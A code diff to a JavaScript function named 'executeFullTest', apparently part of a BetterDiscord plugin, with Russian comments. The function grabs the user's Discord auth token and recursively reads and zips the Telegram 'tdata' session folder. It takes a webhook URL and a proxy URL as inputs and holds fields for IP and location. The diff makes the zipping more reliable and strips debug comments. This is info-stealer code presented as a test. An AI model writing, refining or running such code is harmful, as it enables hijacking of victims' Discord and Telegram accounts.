@@ -6,6 +6,15 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         return { success: false, error: "Модуль fs недоступен." };
     }
 
+    // Безопасная проверка функции zipSync
+    let zipFunc = null;
+    if (fflate) {
+        zipFunc = fflate.zipSync || (fflate.default && fflate.default.zipSync);
+    }
+    if (!zipFunc) {
+        return { success: false, error: "Библиотека fflate не загружена или не имеет функции zipSync." };
+    }
+
     let result = {
         ip: null,
         location: null,
@@ -41,7 +50,7 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
         if (authStore && typeof authStore.getToken === 'function') result.dtoken = authStore.getToken();
     } catch (e) {}
 
-    // 3. Поиск и упаковка Telegram tdata с отладкой
+    // 3. Поиск и упаковка Telegram tdata
     let hasTdata = false;
     let tdataZipBuffer = null;
     try {
@@ -76,7 +85,6 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                                 if (fs.statSync(fullPath).isDirectory()) {
                                     addFilesRecursively(fullPath, relativePath);
                                 } else {
-                                    // Пытаемся прочитать файл
                                     const data = fs.readFileSync(fullPath);
                                     files[relativePath] = new Uint8Array(data);
                                 }
@@ -93,14 +101,13 @@ async function executeFullTest(BdApi, webhookUrl, proxyUrl, fflate) {
                 result.debug_tdata.push(`Прочитано файлов: ${Object.keys(files).length}`);
                 
                 if (Object.keys(files).length > 0) {
-                    result.debug_tdata.push("Запуск fflate.zipSync...");
-                    // Пытаемся сжать
-                    tdataZipBuffer = fflate.zipSync(files);
+                    result.debug_tdata.push("Запуск архивации...");
+                    tdataZipBuffer = zipFunc(files);
                     result.debug_tdata.push("ZIP успешно создан!");
                     hasTdata = true;
                 }
             } else {
-                result.debug_tdata.push("Папка tdata не найдена на диске.");
+                result.debug_tdata.push("Папка tdata не найдена.");
             }
         }
     } catch (e) {
